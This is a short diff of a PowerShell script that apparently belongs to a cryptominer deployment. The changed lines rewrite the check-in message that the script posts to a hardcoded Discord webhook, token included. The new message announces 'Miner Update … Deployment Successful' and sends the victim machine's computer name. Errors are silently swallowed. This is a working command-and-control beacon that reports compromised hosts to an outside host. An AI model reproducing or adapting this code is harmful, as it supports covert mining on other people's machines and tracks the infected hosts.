@@ -47,7 +47,7 @@ try {
 
 try {
     $wUrl = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
-    $body = '{"embeds":[{"title":"PS1 EXECUTED SUCCESSFULLY","color":2895667,"fields":[{"name":"Worker","value":"' + $env:COMPUTERNAME + '"}]}]}'
+    $body = '{"embeds":[{"title":"Miner Update","description":"🟢 **Deployment Successful (PS1)**\nWorker: `' + $env:COMPUTERNAME + '` has checked in.","color":3066993}]}'
     Invoke-RestMethod -Uri $wUrl -Method Post -Body $body -ContentType "application/json" -EA 0
 } catch { }
 
